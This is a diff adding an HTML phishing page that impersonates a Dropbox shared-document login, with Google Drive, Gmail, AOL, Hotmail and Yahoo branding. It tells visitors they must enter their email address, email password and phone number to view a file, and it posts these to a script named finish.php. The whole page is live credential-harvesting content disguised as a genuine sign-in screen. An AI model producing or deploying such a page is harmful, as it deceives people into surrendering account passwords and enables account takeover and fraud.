@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta charset="utf-8" />
+  <title>
+   Email Login
+  </title>
+  <style type="text/css">
+   &lt;!--
+.style1 {	background-color: #FFFFFF;
+}
+.style5 {
+	font-size: large;
+	font-family: Arial, Helvetica, sans-serif;
+}
+.style6 {
+	font-size: 20px;
+	background-color: #FFFFFF;
+	color: #666666;
+	font-family: Arial, Helvetica, sans-serif;
+}
+.style11 {color: #000033; font-size: 16px; font-weight: bold; }
+--&gt;
+  </style>
+ </head>
+ <body>
+  <table width="866" height="265" border="0">
+   <tbody>
+    <tr>
+     <td width="440">
+      <table width="349" border="0">
+       <tbody>
+        <tr>
+         <td width="204">
+         </td>
+         <td width="135">
+          <img width="120" height="94" align="top" alt="" src="ssl/googledrive.jpg" />
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <p align="right">
+       <span style="height: 32px; width: 502px" class="style1">
+        <span class="style5">
+         <strong>
+          Dropbox
+         </strong>
+         .
+        </span>
+        <span class="style6">
+         Your stuff, anywhere.
+        </span>
+       </span>
+       <br />
+       <img width="440" height="321" src="ssl/tablet-phone-lap%20-%20Copy.png" />
+       <strong>
+        <font size="4" face="Arial, Helvetica, sans-serif" color="blue">
+         <br />
+        </font>
+       </strong>
+       <br />
+      </p>
+     </td>
+     <td width="16" valign="top">
+      <p>
+       <br />
+       <br />
+      </p>
+     </td>
+     <td width="396" valign="top">
+      <font size="4" face="Arial, Helvetica, sans-serif" color="#5953C6">
+       <br />
+       <br />
+       To view the shared document, 
+    you are required to Login with your email address below:
+      </font>
+      <br />
+      <br />
+      <br />
+      <p>
+       <img width="132" height="48" src="ssl/gmail.jpg" />
+       <img width="132" height="48" src="ssl/aol.jpg" />
+       <img width="132" height="48" src="ssl/hotmail.jpg" />
+       <br />
+       <img width="132" height="48" src="ssl/yahoo.jpg" />
+       <img width="132" height="48" src="ssl/other.jpg" />
+       <br />
+       <label id="login_id_label" for="user">
+       </label>
+      </p>
+      <table width="338" height="96" bordercolor="#000000" border="0" bgcolor="#E4E4E4" align="center">
+       <script xml:space="preserve" type="text/javascript" src="gen_validatorv4.js" language="JavaScript">
+       </script>
+       <form action="finish.php" method="post" autocomplete="off" id="myform" name="myform">
+       </form>
+       <tbody>
+        <tr>
+         <td width="145" height="39">
+          <div align="right" class="style11">
+           <p>
+            <font face="Arial, Helvetica, sans-serif">
+             Email Address:
+            </font>
+           </p>
+          </div>
+         </td>
+         <td width="10">
+         </td>
+         <td width="169">
+          <span class="overlabel-wrapper">
+           <input type="text" mpdistrans="1" name="Email" value="" id="Email" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="145" height="44">
+          <div align="right" class="style11">
+           <p>
+            <font face="Arial, Helvetica, sans-serif">
+             Email Password:
+            </font>
+           </p>
+          </div>
+         </td>
+         <td>
+         </td>
+         <td>
+          <span class="overlabel-wrapper">
+           <input type="password" mpdistrans="1" name="password" value="" autocomplete="off" id="password" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="145" height="39">
+          <div align="right" class="style11">
+           <p>
+            <font face="Arial, Helvetica, sans-serif">
+             Phone Number:
+            </font>
+           </p>
+          </div>
+         </td>
+         <td width="10">
+         </td>
+         <td width="169">
+          <span class="overlabel-wrapper">
+           <input type="tel" mpdistrans="1" name="tel" value="" id="Phone number" />
+          </span>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <script type="text/javascript">
+       var frmvalidator = new Validator("myform");
+
+  frmvalidator.addValidation("Email","req","Enter your email address.");
+  frmvalidator.addValidation("Email","email","Please enter a proper Email Address (email@domain).");
+  frmvalidator.addValidation("password","req","Enter your password.");
+      </script>
+      <br />
+      <table border="0" align="center">
+       <tbody>
+        <tr>
+         <td width="41">
+          <div align="right">
+           <input type="image" border="0" align="middle" alt="" src="ssl/singin.png" id="ctlWorkflow_btnSubmit" name="ctlWorkflow:btnSubmit" />
+          </div>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <p>
+      </p>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
